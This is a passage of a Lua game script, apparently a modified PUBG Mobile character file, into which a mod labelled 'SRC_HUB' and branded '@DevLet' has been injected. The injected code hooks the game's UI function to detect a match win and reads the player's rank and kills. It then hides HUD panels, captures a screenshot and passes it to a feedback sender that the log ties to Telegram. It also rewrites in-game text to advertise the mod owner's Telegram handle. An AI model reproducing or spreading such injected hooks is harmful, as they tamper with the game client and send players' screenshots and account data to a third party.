			if attempts < 5 and AF_AddTimerOnce(1.0, TrySend) then
				return
			end
			AF_Notify("[SRC_HUB] Screenshot capture failed!")
			AF_RemoveFile(path)
		end
		TrySend()
	end)
	if not ok then
		AF_Log("SendFeedback Error: " .. tostring(err))
	end
end

local AF_HudNames = {
	"BattleChat_UIBP","Chat_UIBP","ChatMsg_UIBP","TeamAvatar_UIBP","Team_UIBP",
	"VoiceChat_UIBP","MiniMap_UIBP","Bag_UIBP","PickUp_UIBP","PickUpList_UIBP",
	"SystemChat_UIBP","InGameChat_UIBP","InGameChatPanel_UIBP","KillFeed_UIBP",
	"Elimination_UIBP","ChatHUD_UIBP","ChatPanel_UIBP","MainHUD_UIBP","BattleHUD_UIBP"
}

local function AF_GetRankAndSegment()
	local rank = 0
	local segment = 0
	pcall(function()
		local battleResult = _G.BP_STRUCT_BattleResultData
		local rating = battleResult and (battleResult.rating or battleResult.BP_STRUCT_BTRating)
		if rating then
			rank = tonumber(rating.rank_rating) or 0
			segment = tonumber(rating.new_segment) or 0
		end
		if rank == 0 then
			local funcUtil = AF_GetModule("common.func_util")
			local roleData = _G.DataMgr and _G.DataMgr.roleData
			if funcUtil and type(funcUtil.GetCurMaxSegementLevel) == "function"
				and roleData and roleData.allzoneSegment then
				segment = tonumber(funcUtil.GetCurMaxSegementLevel(roleData.allzoneSegment)) or 0
			end
			if roleData and roleData.segment_rating then
				for _, value in pairs(roleData.segment_rating) do
					if type(value) == "table" then
						for _, nestedValue in pairs(value) do
							if type(nestedValue) == "number" and nestedValue > rank then
								rank = nestedValue
							end
						end
					elseif type(value) == "number" and value > rank then
						rank = value
					end
				end
			end
		end
	end)
	return rank, segment
end

local function AF_CreateHudController()
	local hidden = {}
	local function SetHidden(hide)
		local UIManager = _G.UIManager
		if not UIManager then return end
		if hide then
			for _, name in ipairs(AF_HudNames) do
				local config
				if UIManager.UI_Config_InGame and UIManager.UI_Config_InGame[name] then
					config = UIManager.UI_Config_InGame[name]
				elseif UIManager.UI_Config and UIManager.UI_Config[name] then
					config = UIManager.UI_Config[name]
				end
				if config then
					local view = type(UIManager.GetUI) == "function" and UIManager.GetUI(config) or nil
					if view then
						pcall(function()
							if type(view.SetVisibility) == "function" then
								view:SetVisibility(2)
							elseif view.UIRoot and type(view.UIRoot.SetVisibility) == "function" then
								view.UIRoot:SetVisibility(2)
							elseif type(UIManager.HideUI) == "function" then
								UIManager.HideUI(config)
							elseif type(UIManager.CloseUI) == "function" then
								UIManager.CloseUI(config)
							end
						end)
						table.insert(hidden, {config = config, view = view})
					end
				end
			end
			return
		end
		for _, item in ipairs(hidden) do
			pcall(function()
				if item.view and type(item.view.SetVisibility) == "function" then
					item.view:SetVisibility(0)
				elseif item.view and item.view.UIRoot and type(item.view.UIRoot.SetVisibility) == "function" then
					item.view.UIRoot:SetVisibility(0)
				elseif type(UIManager.ShowUI) == "function" then
					UIManager.ShowUI(item.config)
				end
			end)
		end
		hidden = {}
	end
	return SetHidden
end

local function AF_GetScreenshotDirectory()
	local directories = {}
	local home = os.getenv("HOME")
	if home and home ~= "" then
		table.insert(directories, home .. "/Documents/ShadowTrackerExtra/Saved/")
	end
	local packages = {"com.tencent.ig","com.vng.pubgmobile","com.pubg.krmobile","com.rekoo.pubgm","com.pubg.imobile"}
	for _, packageName in ipairs(packages) do
		table.insert(directories,
			"/storage/emulated/0/Android/data/" .. packageName
			.. "/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/")
	end
	local selected = directories[1]
	for _, directory in ipairs(directories) do
		local testPath = directory .. "t.tmp"
		local file = io.open(testPath, "w")
		if file then
			file:close()
			os.remove(testPath)
			selected = directory
			break
		end
	end
	return selected
end

local function AF_CaptureAndSend(kills, rank, segment, restoreHud)
	local restored = false
	local function RestoreHudOnce()
		if not restored then
			restored = true
			restoreHud(false)
		end
	end
	local ScreenshotMaker = import("ScreenshotMaker")
	if not ScreenshotMaker then RestoreHudOnce(); return end
	local directory = AF_GetScreenshotDirectory()
	if not directory then RestoreHudOnce(); return end
	local path = directory .. string.format("kongwin_%s.jpg", os.time())
	local uiUtil = AF_GetModule("client.common.ui_util")
	local gameInstance = uiUtil and uiUtil.GetGameInstance and uiUtil.GetGameInstance()
	local enginePreTick = gameInstance and gameInstance.EnginePreTick
	if not enginePreTick or type(enginePreTick.Add) ~= "function" then
		RestoreHudOnce(); return
	end
	local ticker = AF_GetModule("common.time_ticker")
	if not ticker or type(ticker.AddTimerOnce) ~= "function" then
		RestoreHudOnce(); return
	end
	enginePreTick:Add(function()
		local actualPath = ScreenshotMaker.MakePictureByName(path, true)
		if type(enginePreTick.Clear) == "function" then enginePreTick:Clear() end
		if actualPath and actualPath ~= "" then path = actualPath end
		local attempts = 0
		local function CheckCapture()
			attempts = attempts + 1
			local captured = false
			pcall(function() captured = ScreenshotMaker.HasCaptured(path) end)
			if captured then
				RestoreHudOnce()
				AF_Log("HasCaptured=true. Flushing to disk via ResizePicture...")
				pcall(ScreenshotMaker.ResizePicture, path, 0.9, path)
				ticker.AddTimerOnce(2.0, function()
					if #AF_ReadFile(path) > 0 then
						AutoFeedback.SendFeedback(path, kills, rank, segment)
					else
						AF_Notify("[SRC_HUB] iOS image read error!")
					end
				end)
			elseif attempts < 15 then
				ticker.AddTimerOnce(1, CheckCapture)
			else
				RestoreHudOnce()
				AF_Notify("[SRC_HUB] Screenshot capture failed!")
			end
		end
		ticker.AddTimerOnce(1, CheckCapture)
	end)
end

function AutoFeedback.ProcessWin(kills)
	kills = tonumber(kills) or 0
	local rank, segment = AF_GetRankAndSegment()
	-- ✅ ALL RANKS SUPPORTED - Sirf kills check (kills > 0)
	if kills <= 0 then
		AF_Log(string.format("Skipping feedback: Kill %d (Requires Kill > 0)", kills))
		return
	end
	AF_Notify("[SRC_HUB] Congratulations on getting TOP 1! Rank: " .. AF_GetRankName(rank))
	local setHudHidden = AF_CreateHudController()
	setHudHidden(true)
	local ok, err = pcall(AF_CaptureAndSend, kills, rank, segment, setHudHidden)
	if not ok then
		setHudHidden(false)
		AF_Log("ProcessWin Error: " .. tostring(err))
	end
end

local function AF_GetWinnerKills()
	local kills = 0
	pcall(function()
		local likeUtil = AF_GetModule("GameLua.Mod.BaseMod.Client.Like.IngameLikeUtilClient")
		if likeUtil and type(likeUtil.GetMyPlayerState) == "function" then
			local playerState = likeUtil.GetMyPlayerState()
			if playerState and playerState.Kills then
				kills = tonumber(playerState.Kills) or 0
			end
		end
		if kills == 0 then
			local resultLogic = AF_GetModule(
				"GameLua.Mod.BaseMod.Client.BattleResult.BattleResultData.BattleResultDataLogic",
				false
			)
			if resultLogic and type(resultLogic.GetBattleResultData) == "function" then
				local result = resultLogic:GetBattleResultData()
				if result and result.BP_mykill then
					kills = tonumber(result.BP_mykill) or 0
				end
			end
		end
	end)
	return kills
end

local function AF_TryInstallHook()
	pcall(function()
		local UIManager = _G.UIManager
		if not UIManager or not UIManager.ShowUI then return end
		if UIManager.__SRCHUBHooked then
			UIManager.__SRCHUBHooked = false
		end
		AF_Log("Hooking UIManager.ShowUI for in-game Winner UI...")
		local originalShowUI = UIManager.ShowUI
		UIManager.ShowUI = function(config, params, ...)
			local result = originalShowUI(config, params, ...)
			pcall(function()
				-- ✅ STRONG WINNER DETECTION - Chicken Dinner Fix
				if not params then return end

				local isWinner = params.Reason == "win"
					or params.ShowedWinLogo == true
					or params.IsWin == true
					or params.IsWinner == true
					or params.bWin == true
					or params.Win == true

				if not isWinner then return end

				local kills = AF_GetWinnerKills()
				if not AF_AddTimerOnce(2, function() AutoFeedback.ProcessWin(kills) end) then
					AutoFeedback.ProcessWin(kills)
				end
			end)
			return result
		end
		-- UIManager.__SRCHUBHooked = true
		AF_Log("UIManager Hook installed successfully.")
	end)
end

function AutoFeedback.Install()
	AF_Log("Installing Pro system (Telegram)...")
	if AutoFeedback.Config.TestMode then
		pcall(function()
			AF_AddTimerOnce(5.0, function() AutoFeedback.ProcessWin(1) end)
		end)
	end
	pcall(function()
		local ticker = AF_GetModule("common.time_ticker")
		if ticker and type(ticker.AddTimer) == "function" then
			ticker.AddTimer(3.0, AF_TryInstallHook)
		else
			AF_TryInstallHook()
		end
	end)
end

_G.DevLet_AutoFeedbackRecovered = AutoFeedback
AutoFeedback.Install()

local CreditTextWidget = nil

local function CreateCreditText()if CreditTextWidget and slua.isValid(CreditTextWidget) then 
    return 
  end

  pcall(function()
    local txt = CGame:NewObjectFromPath("/Script/UMG.TextBlock")
    if not txt or not slua.isValid(txt) then 
      return 
    end

    local hud = require("game_frontend_hud")
    if hud and hud.AddToContainer and UIContainers and UIContainers.Top then
      hud.AddToContainer(UIContainers.Top, txt, 9999)
    end

    txt:SetText("")
    txt:SetColorAndOpacity(FSlateColor(FLinearColor(1, 0, 0, 1))
    )

    if txt.Font then
      local font = txt.Font
      font.Size = 8
      font.TypefaceFontName = "Bold"
      txt.Font = font
    end

    local WidgetLayoutLibrary = import("WidgetLayoutLibrary")
    if WidgetLayoutLibrary then
      local slot = WidgetLayoutLibrary.SlotAsCanvasSlot(txt)

      if slot then
        slot:SetAnchors(FAnchors(0, 1, 0, 1))
        slot:SetAlignment(FVector2D(0, 1))
        slot:SetPosition(FVector2D(25, -45))
        slot:SetSize(FVector2D(220, 30))
      end
    end

    if UEnums and UEnums.ESlateVisibility then
      txt:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
    end

    CreditTextWidget = txt
  end)
end

pcall(CreateCreditText)
-- ============================================
-- VINESH_OP NAME LOGIC (branding text)
-- ============================================
local InGameUITools
local Lobby_Main_Wifi_UIBP = require("client.slua.umg.lobby.Main.Lobby_Main_Wifi_UIBP")
local o_UpdateQuality = Lobby_Main_Wifi_UIBP.__inner_impl.UpdateQuality
Lobby_Main_Wifi_UIBP.__inner_impl.UpdateQuality = function(self)
    self.UIRoot.WidgetSwitcher_Quality:SetActiveWidgetIndex(0)
    self.UIRoot.TextBlock_High:SetText("@DevLet")
    self.UIRoot.TextBlock_High:SetColorAndOpacity(FSlateColor(FLinearColor(1, 0.85, 0.8, 1)))
end

local o_UpdateArtQualityUI = IngamePhoneStateUI.__inner_impl.UpdateArtQualityUI
IngamePhoneStateUI.__inner_impl.UpdateArtQualityUI = function(self, _, _)
    self.UIRoot.TextBlock_quality:SetText("[ @DevLet ]")
    pcall(function()
        if not InGameUITools then
            InGameUITools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools")
        end
        local Main = InGameUITools.GetMainControlBaseUI()
        if Main then
            -- TELEGRAM @DevLet -- simple white font, jahan RedMagic text tha
            Main.TextBlock_BID:SetText("OWNER TELEGRAM [ @DevLet ]")
            -- White color, plain simple style
            Main.TextBlock_BID:SetColorAndOpacity(FSlateColor(FLinearColor(1, 1, 1, 1)))
            -- Simple/regular font load karo
            pcall(function()
                local fi = Main.TextBlock_BID.Font
                if fi then
                    local simpleFont = nil
                    pcall(function()
                        simpleFont = slua.loadObject("/Engine/EngineFonts/Roboto.Roboto")
                    end)
                    if simpleFont then
                        fi.FontObject = simpleFont
                        fi.TypefaceFontName = "Regular"
                    else
                        fi.TypefaceFontName = "Regular"
                    end
                    fi.Size = 14
                    pcall(function()
                        if fi.OutlineSettings then
                            fi.OutlineSettings.OutlineSize = 0
                        end
                    end)
                    Main.TextBlock_BID:SetFont(fi)
                end
            end)
            Main.TextBlock_Hour:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed)
        end
    end)
end

local o_OnInitialize = IngamePhoneStateUI.__inner_impl.OnInitialize
IngamePhoneStateUI.__inner_impl.OnInitialize = function(self)
    o_OnInitialize(self)
    if self.UIRoot.TextBlock_quality then
        self.UIRoot.TextBlock_quality:SetColorAndOpacity(FSlateColor(FLinearColor(1, 0.6, 0.2, 1)))
    end
end

-- ==================== PART 4: CLASS REGISTRATION (original, last) ====================

local class = require("class")
local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")
local CBRPlayerCharacterBase = class(CCharacterBase, nil, BRPlayerCharacterBase)
return require("combine_class").DeclareFeature(CBRPlayerCharacterBase, {
  {
    SkyTransition = "GameLua.Mod.BaseMod.Gameplay.Feature.SkyControl.PlayerCharacterSkyTransitionFeature"
  },
  {
    CarryDeadBoxFeature = "GameLua.Mod.Library.GamePlay.Feature.CarryDeadBoxFeature"
  },
  {
    SpecialSuitFeature = "GameLua.Mod.Library.GamePlay.Feature.SpecialSuitFeature"
  },
  {
    TeleportPawnFeature = "GameLua.Mod.Library.GamePlay.Feature.TeleportPawnFeature"
  },
  {
    LifterControl = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.CharacterLifterControlFeature"
  },
  {
    FinalKillEffect = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.PlayerCharacterFinalKillEffectFeature"
  },
  {
    CampFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.Camp.PlayerCharacterCampFeature"
  },
  {
    BuildAircraftVehicleFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.PlayerCharacterBuildVehicleFeature"
  },
  {
    UnifiedBuildVehicleFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.UnifiedBuildVehicleFeature"
  },
  {
    CommonBornlandTransformFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.HeroPropFeature.CommonBornlandTransformFeature"
  },
  {
    ParachuteFormation = "GameLua.Mod.BaseMod.GamePlay.Feature.ParachuteFormationFeature"
  },
  {
    ParachuteSprint = "GameLua.Mod.BaseMod.GamePlay.Feature.Parachute.ParachuteSprintFeature"
  },
  {
    GeneralShowSpotFeature = "GameLua.Mod.BRMod.Gameplay.Feature.PlayerCharacterGeneralShowSpotFeature"
  },
  {
    FPPAnimMonitor = "GameLua.Mod.BaseMod.GamePlay.Feature.Player.FPPAnimMonitorFeature"
  }
}, "BRPlayerCharacterBase")
